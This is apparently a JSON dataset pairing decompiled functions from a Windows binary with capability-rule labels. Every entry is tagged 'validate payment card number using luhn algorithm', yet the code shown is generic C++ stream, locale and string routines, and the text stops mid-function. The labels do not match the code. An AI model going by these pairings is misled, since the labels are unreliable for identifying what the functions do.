{
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "18000237": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t fcn.180002370(int64_t arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    fcn.18006da30(arg1, 0);\n    *(arg1 + 8) = 0;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x18) = 0;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x28) = 0;\n    *(arg1 + 0x30) = 0;\n    *(arg1 + 0x38) = 0;\n    *(arg1 + 0x40) = 0;\n    *(arg1 + 0x48) = 0;\n    *(arg1 + 0x50) = 0;\n    *(arg1 + 0x58) = 0;\n    *(arg1 + 0x60) = 0;\n    if (arg2 != 0) {\n        fcn.180073c8c(arg1, arg2);\n        return arg1;\n    }\n    fcn.18006dfd0(\"bad locale name\");\n    pcVar1 = swi(3);\n    iVar2 = (*pcVar1)();\n    return iVar2;\n}\n",
        "token_count": 288
    },
    "1800023f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.1800023f0(int32_t *arg1)\n\n{\n    int32_t iVar1;\n    \n    fcn.180073cf8(arg1);\n    if (*(arg1 + 0x16) != 0) {\n        fcn.1800b2bb8(*(arg1 + 0x16));\n    }\n    *(arg1 + 0x16) = 0;\n    if (*(arg1 + 0x12) != 0) {\n        fcn.1800b2bb8(*(arg1 + 0x12));\n    }\n    *(arg1 + 0x12) = 0;\n    if (*(arg1 + 0xe) != 0) {\n        fcn.1800b2bb8(*(arg1 + 0xe));\n    }\n    *(arg1 + 0xe) = 0;\n    if (*(arg1 + 10) != 0) {\n        fcn.1800b2bb8(*(arg1 + 10));\n    }\n    *(arg1 + 10) = 0;\n    if (*(arg1 + 6) != 0) {\n        fcn.1800b2bb8(*(arg1 + 6));\n    }\n    *(arg1 + 6) = 0;\n    if (*(arg1 + 2) != 0) {\n        fcn.1800b2bb8(*(arg1 + 2));\n    }\n    *(arg1 + 2) = 0;\n    iVar1 = *arg1;\n    if (iVar1 == 0) {\n    // WARNING: Could not recover jumptable at 0x0001800badf3. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x1800de500)(0x180129530);\n        return;\n    }\n    if (iVar1 < 8) {\n        fcn.180074eb8(iVar1 * 0x28 + 0x180128530);\n    }\n    return;\n}\n",
        "token_count": 436
    },
    "18000382": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180003820(int64_t arg1)\n\n{\n    uchar (*pauVar1) [16];\n    ulong uVar2;\n    \n    *(arg1 + 0x40) = 0;\n    *(arg1 + 8) = 0;\n    *(arg1 + 0x14) = 0;\n    *(arg1 + 0x18) = 0x201;\n    *(arg1 + 0x20) = 6;\n    *(arg1 + 0x28) = 0;\n    *(arg1 + 0x30) = 0;\n    *(arg1 + 0x38) = 0;\n    *(arg1 + 0x10) = 0;\n    pauVar1 = fcn.18008fb2c(0x10);\n    *pauVar1 = ZEXT816(0);\n    uVar2 = fcn.180073b64(1);\n    *(*pauVar1 + 8) = uVar2;\n    *(arg1 + 0x40) = pauVar1;\n    return;\n}\n",
        "token_count": 239
    },
    "18000ae8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18000ae80(int64_t *arg1)\n\n{\n    code **arg1_00;\n    \n    arg1_00 = arg1 + 0x16;\n    *(*(*arg1 + 4) + -0xb0 + arg1_00) = vtable.std::basic_ifstream_char__struct_std::char_traits_char__.0;\n    *(*(*arg1 + 4) + -0xb4 + arg1_00) = *(*arg1 + 4) + -0xb0;\n    fcn.18000ff30(arg1 + 2);\n    *(*(*arg1 + 4) + -0xb0 + arg1_00) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n    *(*(*arg1 + 4) + -0xb4 + arg1_00) = *(*arg1 + 4) + -0x18;\n    *arg1_00 = vtable.std::ios_base.0;\n    fcn.180073e6c(arg1_00);\n    return;\n}\n",
        "token_count": 234
    },
    "18000b38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18000b380(int64_t *arg1)\n\n{\n    code **arg1_00;\n    \n    arg1_00 = arg1 + 0x15;\n    *(*(*arg1 + 4) + -0xa8 + arg1_00) = vtable.std::basic_ofstream_char__struct_std::char_traits_char__.0;\n    *(*(*arg1 + 4) + -0xac + arg1_00) = *(*arg1 + 4) + -0xa8;\n    fcn.18000ff30(arg1 + 1);\n    *(*(*arg1 + 4) + -0xa8 + arg1_00) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    *(*(*arg1 + 4) + -0xac + arg1_00) = *(*arg1 + 4) + -0x10;\n    *arg1_00 = vtable.std::ios_base.0;\n    fcn.180073e6c(arg1_00);\n    return;\n}\n",
        "token_count": 232
    },
    "18000c1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18000c1d0(int64_t *arg1)\n\n{\n    code **arg1_00;\n    \n    arg1_00 = arg1 + 0x16;\n    *(*(*arg1 + 4) + -0xb0 + arg1_00) = vtable.std::basic_ifstream_wchar_t__struct_std::char_traits_wchar_t__.0;\n    *(*(*arg1 + 4) + -0xb4 + arg1_00) = *(*arg1 + 4) + -0xb0;\n    fcn.18000ea60(arg1 + 2);\n    *(*(*arg1 + 4) + -0xb0 + arg1_00) = vtable.std::basic_istream_wchar_t__struct_std::char_traits_wchar_t__.0;\n    *(*(*arg1 + 4) + -0xb4 + arg1_00) = *(*arg1 + 4) + -0x18;\n    *arg1_00 = vtable.std::ios_base.0;\n    fcn.180073e6c(arg1_00);\n    return;\n}\n",
        "token_count": 244
    },
    "18000d55": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.18000d550(int64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t arg2_00;\n    code *pcVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    \n    uVar2 = arg1[2];\n    if (uVar2 <= arg2) {\n        uVar3 = arg1[3];\n        if (uVar3 != arg2) {\n            if (uVar3 < arg2) {\n                if (0x7ffffffffffffffe - uVar2 < arg2 - uVar2) {\n                    fcn.180014b60();\n                    pcVar4 = swi(3);\n                    (*pcVar4)();\n                    return;\n                }\n                uVar6 = arg2 | 7;\n                uVar8 = 0x7ffffffffffffffe;\n                if (((uVar6 < 0x7fffffffffffffff) && (uVar3 <= 0x7ffffffffffffffe - (uVar3 >> 1))) &&\n                   (uVar1 = (uVar3 >> 1) + uVar3,  uVar8 = uVar6,  uVar6 < uVar1)) {\n                    uVar8 = uVar1;\n                }\n                iVar7 = uVar8 + 1;\n                if (uVar8 == 0xffffffffffffffff) {\n                    iVar7 = -1;\n                }\n                iVar5 = fcn.180011cf0(arg1, iVar7);\n                arg1[2] = arg2;\n                arg1[3] = uVar8;\n                iVar7 = uVar2 * 2 + 2;\n                if (uVar3 < 8) {\n                    fcn.1800ade80(iVar5, arg1, iVar7);\n                    *arg1 = iVar5;\n                    arg1[2] = uVar2;\n                }\n                else {\n                    arg2_00 = *arg1;\n                    fcn.1800ade80(iVar5, arg2_00, iVar7);\n                    uVar3 = uVar3 * 2 + 2;\n                    iVar7 = arg2_00;\n                    if ((0xfff < uVar3) && (iVar7 = *(arg2_00 + -8),  0x1f < (arg2_00 - iVar7) - 8U)) {\ncode_r0x00018000d6e2:\n                        fcn.1800b3528(iVar7, uVar3 + 0x27);\n                        pcVar4 = swi(3);\n                        (*pcVar4)();\n                        return;\n                    }\n                    fcn.18008fb24(iVar7);\n                    *arg1 = iVar5;\n                    arg1[2] = uVar2;\n                }\n            }\n            else if ((arg2 < 8) && (7 < uVar3)) {\n                iVar5 = *arg1;\n                fcn.1800ade80(arg1, iVar5, uVar2 * 2 + 2);\n                uVar3 = arg1[3] * 2 + 2;\n                iVar7 = iVar5;\n                if ((0xfff < uVar3) && (iVar7 = *(iVar5 + -8),  0x1f < (iVar5 - iVar7) - 8U)) goto code_r0x00018000d6e2;\n                fcn.18008fb24(iVar7);\n                arg1[3] = 7;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 798
    },
    "18000d85": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong * fcn.18000d850(ulong *arg1, ulong arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    \n    iVar1 = arg1[2];\n    if (arg3 <= arg1[3] - iVar1) {\n        arg1[2] = iVar1 + arg3;\n        puVar2 = arg1;\n        if (7 < arg1[3]) {\n            puVar2 = *arg1;\n        }\n        fcn.1800ade80(puVar2 + iVar1 * 2, arg2, arg3 * 2);\n        *(puVar2 + (iVar1 + arg3) * 2) = 0;\n        return arg1;\n    }\n    puVar2 = fcn.180013690(arg1, arg3, 0, arg2);\n    return puVar2;\n}\n",
        "token_count": 196
    },
    "18000d8d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong * fcn.18000d8d0(ulong *arg1, ulong *arg2)\n\n{\n    uint64_t arg2_00;\n    int64_t iVar1;\n    ulong *puVar2;\n    \n    arg2_00 = arg2[2];\n    if (7 < arg2[3]) {\n        arg2 = *arg2;\n    }\n    iVar1 = arg1[2];\n    if (arg2_00 <= arg1[3] - iVar1) {\n        arg1[2] = arg2_00 + iVar1;\n        puVar2 = arg1;\n        if (7 < arg1[3]) {\n            puVar2 = *arg1;\n        }\n        fcn.1800ade80(puVar2 + iVar1 * 2, arg2, arg2_00 * 2);\n        *(puVar2 + (arg2_00 + iVar1) * 2) = 0;\n        return arg1;\n    }\n    puVar2 = fcn.180013690(arg1, arg2_00, 0, arg2);\n    return puVar2;\n}\n",
        "token_count": 244
    },
    "18000dc3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong * fcn.18000dc30(ulong *arg1, ulong *arg2)\n\n{\n    uint64_t arg2_00;\n    int64_t iVar1;\n    ulong *puVar2;\n    \n    arg2_00 = arg2[2];\n    if (0xf < arg2[3]) {\n        arg2 = *arg2;\n    }\n    iVar1 = arg1[2];\n    if (arg2_00 <= arg1[3] - iVar1) {\n        arg1[2] = arg2_00 + iVar1;\n        puVar2 = arg1;\n        if (0xf < arg1[3]) {\n            puVar2 = *arg1;\n        }\n        fcn.1800ade80(puVar2 + iVar1, arg2, arg2_00);\n        *(puVar2 + iVar1 + arg2_00) = 0;\n        return arg1;\n    }\n    puVar2 = fcn.180014270(arg1, arg2_00, 0, arg2);\n    return puVar2;\n}\n",
        "token_count": 233
    },
    "18000ea6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode * fcn.18000ea60(code **arg1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    ulong *puVar3;\n    code *pcVar4;\n    uint *puVar5;\n    ulong unaff_RBX;\n    ulong in_R9;\n    ulong uVar6;\n    \n    uVar6 = 0xfffffffffffffffe;\n    *arg1 = vtable.std::basic_filebuf_wchar_t__struct_std::char_traits_wchar_t__.0;\n    if ((arg1[0x10] != NULL) && (*arg1[3] == arg1 + 0xe)) {\n        pcVar1 = arg1[0x12];\n        pcVar4 = arg1[0x11];\n        *arg1[3] = pcVar4;\n        *arg1[7] = pcVar4;\n        *arg1[10] = pcVar1 - pcVar4 >> 1;\n    }\n    if (*(arg1 + 0x7c) != '\\0') {\n        fcn.180011920(arg1);\n    }\n    *arg1 = vtable.std::basic_streambuf_wchar_t__struct_std::char_traits_wchar_t__.0;\n    pcVar1 = arg1[0xc];\n    if (pcVar1 == NULL) {\n        return vtable.std::basic_streambuf_wchar_t__struct_std::char_traits_wchar_t__.0;\n    }\n    if ((*(pcVar1 + 8) != NULL) && (puVar3 = (**(**(pcVar1 + 8) + 0x10))(),  puVar3 != NULL)) {\n        (***puVar3)(puVar3, 1, *puVar3, in_R9, uVar6);\n    }\n    pcVar4 = NULL;\n    if ((pcVar1 != NULL) &&\n       (uVar6 = *0x180129fa0,  pcVar4 = (**0x1800de208)(*0x180129fa0, 0, pcVar1, in_R9, unaff_RBX),  pcVar4 == 0)) {\n        puVar5 = fcn.1800ba53c(uVar6);\n        uVar2 = (**0x1800de400)();\n        pcVar4 = fcn.1800ba484(uVar2);\n        *puVar5 = pcVar4;\n    }\n    return pcVar4;\n}\n",
        "token_count": 526
    },
    "18000f15": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t * fcn.18000f150(int64_t *arg1, ulong *arg2, ulong noname_2, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    \n    if (7 < arg2[3]) {\n        arg2 = *arg2;\n    }\n    *arg1 = 0x1800ff8e0;\n    arg1[0x15] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n    *(*(*arg1 + 4) + arg1) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    *(*(*arg1 + 4) + -4 + arg1) = *(*arg1 + 4) + -0x10;\n    fcn.180012370(*(*arg1 + 4) + arg1, arg1 + 1);\n    *(*(*arg1 + 4) + arg1) = vtable.std::basic_ofstream_char__struct_std::char_traits_char__.0;\n    *(*(*arg1 + 4) + -4 + arg1) = *(*arg1 + 4) + -0xa8;\n    fcn.180011e90(arg1 + 1);\n    iVar2 = fcn.180011de0(arg1 + 1, arg2, 0x32);\n    if (iVar2 == 0) {\n        iVar2 = *(*arg1 + 4) + arg1;\n        uVar1 = 6;\n        if (*(iVar2 + 0x48) != 0) {\n            uVar1 = 2;\n        }\n        fcn.1800037a0(iVar2, uVar1 | *(iVar2 + 0x10));\n    }\n    *(*(*arg1 + 4) + arg1) = vtable.std::basic_ofstream_char__struct_std::char_traits_char__.0;\n    *(*(*arg1 + 4) + -4 + arg1) = *(*arg1 + 4) + -0xa8;\n    return arg1;\n}\n",
        "token_count": 456
    },
    "18000f28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t * fcn.18000f280(int64_t *arg1, ulong *arg2, ulong noname_2, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    \n    if (7 < arg2[3]) {\n        arg2 = *arg2;\n    }\n    *arg1 = 0x1800ff8c8;\n    arg1[0x16] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n    *(*(*arg1 + 4) + arg1) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n    *(*(*arg1 + 4) + -4 + arg1) = *(*arg1 + 4) + -0x18;\n    arg1[1] = 0;\n    fcn.180012370(*(*arg1 + 4) + arg1, arg1 + 2);\n    *(*(*arg1 + 4) + arg1) = vtable.std::basic_ifstream_char__struct_std::char_traits_char__.0;\n    *(*(*arg1 + 4) + -4 + arg1) = *(*arg1 + 4) + -0xb0;\n    fcn.180011e90(arg1 + 2);\n    iVar2 = fcn.180011de0(arg1 + 2, arg2, 0x25);\n    if (iVar2 == 0) {\n        iVar2 = *(*arg1 + 4) + arg1;\n        uVar1 = 6;\n        if (*(iVar2 + 0x48) != 0) {\n            uVar1 = 2;\n        }\n        fcn.1800037a0(iVar2, uVar1 | *(iVar2 + 0x10));\n    }\n    *(*(*arg1 + 4) + arg1) = vtable.std::basic_ifstream_char__struct_std::char_traits_char__.0;\n    *(*(*arg1 + 4) + -4 + arg1) = *(*arg1 + 4) + -0xb0;\n    return arg1;\n}\n",
        "token_count": 466
    },
    "18000ff3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode * fcn.18000ff30(code **arg1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    ulong *puVar3;\n    code *pcVar4;\n    uint *puVar5;\n    ulong unaff_RBX;\n    ulong in_R9;\n    ulong uVar6;\n    \n    uVar6 = 0xfffffffffffffffe;\n    *arg1 = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    if ((arg1[0x10] != NULL) && (*arg1[3] == arg1 + 0xe)) {\n        pcVar1 = arg1[0x12];\n        pcVar4 = arg1[0x11];\n        *arg1[3] = pcVar4;\n        *arg1[7] = pcVar4;\n        *arg1[10] = pcVar1 - pcVar4;\n    }\n    if (*(arg1 + 0x7c) != '\\0') {\n        fcn.180011c30(arg1);\n    }\n    *arg1 = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    pcVar1 = arg1[0xc];\n    if (pcVar1 == NULL) {\n        return vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    }\n    if ((*(pcVar1 + 8) != NULL) && (puVar3 = (**(**(pcVar1 + 8) + 0x10))(),  puVar3 != NULL)) {\n        (***puVar3)(puVar3, 1, *puVar3, in_R9, uVar6);\n    }\n    pcVar4 = NULL;\n    if ((pcVar1 != NULL) &&\n       (uVar6 = *0x180129fa0,  pcVar4 = (**0x1800de208)(*0x180129fa0, 0, pcVar1, in_R9, unaff_RBX),  pcVar4 == 0)) {\n        puVar5 = fcn.1800ba53c(uVar6);\n        uVar2 = (**0x1800de400)();\n        pcVar4 = fcn.1800ba484(uVar2);\n        *puVar5 = pcVar4;\n    }\n    return pcVar4;\n}\n",
        "token_count": 512
    },
    "180010b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nint64_t ** fcn.180010b50(int64_t **arg1, int64_t *arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    *arg1 = arg2;\n    iVar2 = *arg2;\n    piVar1 = *(*(iVar2 + 4) + 0x48 + arg2);\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n        iVar2 = *arg2;\n    }\n    if (((*(*(iVar2 + 4) + 0x10 + arg2) == 0) && (piVar1 = *(*(iVar2 + 4) + 0x50 + arg2),  piVar1 != NULL)) &&\n       (piVar1 != arg2)) {\n        fcn.180011f50(piVar1);\n        iVar2 = *arg2;\n    }\n    *(arg1 + 1) = *(*(iVar2 + 4) + 0x10 + arg2) == 0;\n    return arg1;\n}\n",
        "token_count": 236
    },
    "180010ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong * fcn.180010ea0(ulong *arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    ushort *puVar4;\n    ushort in_R8W;\n    \n    iVar2 = arg1[2];\n    if (arg1[3] - iVar2 < arg2) {\n        puVar3 = fcn.180013d50(arg1, arg2, 0, arg2);\n        return puVar3;\n    }\n    iVar1 = iVar2 + arg2;\n    arg1[2] = iVar1;\n    puVar3 = arg1;\n    if (7 < arg1[3]) {\n        puVar3 = *arg1;\n    }\n    puVar4 = puVar3 + iVar2 * 2;\n    if (arg2 != 0) {\n        for (; arg2 != 0; arg2 = arg2 - 1) {\n            *puVar4 = in_R8W;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    *(puVar3 + iVar1 * 2) = 0;\n    return arg1;\n}\n",
        "token_count": 259
    },
    "18001128": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong * fcn.180011280(ulong *arg1, ulong arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    \n    iVar1 = arg1[2];\n    if (arg3 <= arg1[3] - iVar1) {\n        arg1[2] = iVar1 + arg3;\n        puVar2 = arg1;\n        if (0xf < arg1[3]) {\n            puVar2 = *arg1;\n        }\n        fcn.1800ade80(puVar2 + iVar1, arg2, arg3);\n        *(puVar2 + iVar1 + arg3) = 0;\n        return arg1;\n    }\n    puVar2 = fcn.180014270(arg1, arg3, 0, arg2);\n    return puVar2;\n}\n",
        "token_count": 185
    },
    "180011d6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.180011d60(int64_t *arg1)\n\n{\n    int64_t arg1_00;\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    \n    iVar3 = *arg1;\n    if (*(*(iVar3 + 4) + 0x10 + arg1) == 0) {\n        arg1_00 = *(*(iVar3 + 4) + 0x50 + arg1);\n        if (arg1_00 != 0) {\n            fcn.1800122a0(arg1_00);\n            iVar3 = *arg1;\n        }\n        if (*(*(iVar3 + 4) + 0x10 + arg1) == 0) {\n            return CONCAT71(*(iVar3 + 4) >> 8, 1);\n        }\n    }\n    iVar3 = *(iVar3 + 4) + arg1;\n    uVar1 = 6;\n    if (*(iVar3 + 0x48) != 0) {\n        uVar1 = 2;\n    }\n    uVar2 = fcn.1800037a0(iVar3, uVar1 | *(iVar3 + 0x10));\n    return uVar2 & 0xffffffffffffff00;\n}\n",
        "token_count": 281
    },
    "180011e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\ncode ** fcn.180011e90(code **arg1)\n\n{\n    uchar (*pauVar1) [16];\n    ulong uVar2;\n    \n    *arg1 = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    pauVar1 = fcn.18008fb2c(0x10);\n    *pauVar1 = ZEXT816(0);\n    uVar2 = fcn.180073b64(1);\n    *(*pauVar1 + 8) = uVar2;\n    arg1[0xc] = pauVar1;\n    arg1[3] = arg1 + 1;\n    arg1[4] = arg1 + 2;\n    arg1[7] = arg1 + 5;\n    arg1[8] = arg1 + 6;\n    arg1[10] = arg1 + 9;\n    arg1[0xb] = arg1 + 0x4c;\n    arg1[2] = NULL;\n    *arg1[8] = 0;\n    *arg1[0xb] = 0;\n    *arg1[3] = 0;\n    *arg1[7] = 0;\n    *arg1[10] = 0;\n    *arg1 = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    fcn.180011b20(arg1, 0, 0);\n    return arg1;\n}\n",
        "token_count": 323
    },
    "18001201": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nvoid fcn.180012010(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    \n    iVar2 = *(*arg1 + 4);\n    if ((*(iVar2 + 0x10 + arg1) == 0) && ((*(iVar2 + 0x18 + arg1) & 2) != 0)) {\n        iVar1 = (**(**(iVar2 + 0x48 + arg1) + 0x68))();\n        if (iVar1 == -1) {\n            iVar2 = *(*arg1 + 4) + arg1;\n            fcn.1800037a0(iVar2, *(iVar2 + 0x10) | 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "18001207": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint64_t fcn.180012070(int64_t *arg1)\n\n{\n    int64_t arg1_00;\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    \n    iVar3 = *arg1;\n    if (*(*(iVar3 + 4) + 0x10 + arg1) == 0) {\n        arg1_00 = *(*(iVar3 + 4) + 0x50 + arg1);\n        if (arg1_00 != 0) {\n            fcn.180011f50(arg1_00);\n            iVar3 = *arg1;\n        }\n        if (*(*(iVar3 + 4) + 0x10 + arg1) == 0) {\n            return CONCAT71(*(iVar3 + 4) >> 8, 1);\n        }\n    }\n    iVar3 = *(iVar3 + 4) + arg1;\n    uVar1 = 6;\n    if (*(iVar3 + 0x48) != 0) {\n        uVar1 = 2;\n    }\n    uVar2 = fcn.1800037a0(iVar3, uVar1 | *(iVar3 + 0x10));\n    return uVar2 & 0xffffffffffffff00;\n}\n",
        "token_count": 279
    },
    "1800129e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint * fcn.1800129e0(int64_t *arg1, uint *arg2, uint *arg3)\n\n{\n    int64_t iVar1;\n    uint *puVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint64_t uVar7;\n    uint *puVar8;\n    uint64_t uVar9;\n    uint *puVar10;\n    int64_t iVar11;\n    uint64_t uVar12;\n    uint *puVar13;\n    uint64_t uVar14;\n    uint *puVar15;\n    \n    iVar1 = *arg1;\n    iVar11 = arg1[1] - iVar1 >> 5;\n    if (iVar11 == 0x7ffffffffffffff) {\n        fcn.180014900();\n        pcVar3 = swi(3);\n        puVar13 = (*pcVar3)();\n        return puVar13;\n    }\n    uVar12 = iVar11 + 1;\n    uVar9 = arg1[2] - iVar1 >> 5;\n    uVar7 = uVar12;\n    if ((uVar9 <= 0x7ffffffffffffff - (uVar9 >> 1)) && (uVar7 = (uVar9 >> 1) + uVar9,  uVar7 < uVar12)) {\n        uVar7 = uVar12;\n    }\n    puVar13 = NULL;\n    uVar14 = uVar7 * 0x20;\n    uVar9 = 0xffffffffffffffff;\n    if ((uVar7 < 0x800000000000000) && (uVar9 = uVar14,  uVar14 < 0x1000)) {\n        if (uVar14 != 0) {\n            puVar13 = fcn.18008fb2c(uVar14);\n        }\n    }\n    else {\n        uVar14 = uVar9 + 0x27;\n        if (uVar9 + 0x27 <= uVar9) {\n            uVar14 = 0xffffffffffffffff;\n        }\n        iVar11 = fcn.18008fb2c(uVar14);\n        if (iVar11 == 0) goto code_r0x000180012c49;\n        puVar13 = iVar11 + 0x27U & 0xffffffffffffffe0;\n        *(puVar13 + -2) = iVar11;\n    }\n    puVar15 = (arg2 - iVar1 & 0xffffffffffffffe0U) + puVar13;\n    *(puVar15 + 4) = 0;\n    *(puVar15 + 6) = 0;\n    uVar4 = arg3[1];\n    uVar5 = arg3[2];\n    uVar6 = arg3[3];\n    *puVar15 = *arg3;\n    puVar15[1] = uVar4;\n    puVar15[2] = uVar5;\n    puVar15[3] = uVar6;\n    uVar4 = arg3[5];\n    uVar5 = arg3[6];\n    uVar6 = arg3[7];\n    puVar15[4] = arg3[4];\n    puVar15[5] = uVar4;\n    puVar15[6] = uVar5;\n    puVar15[7] = uVar6;\n    *(arg3 + 4) = 0;\n    *(arg3 + 6) = 0xf;\n    *arg3 = 0;\n    puVar2 = arg1[1];\n    puVar8 = *arg1;\n    puVar10 = puVar13;\n    if (arg2 == puVar2) {\n        for (; puVar8 != puVar2; puVar8 = puVar8 + 8) {\n            *(puVar10 + 4) = 0;\n            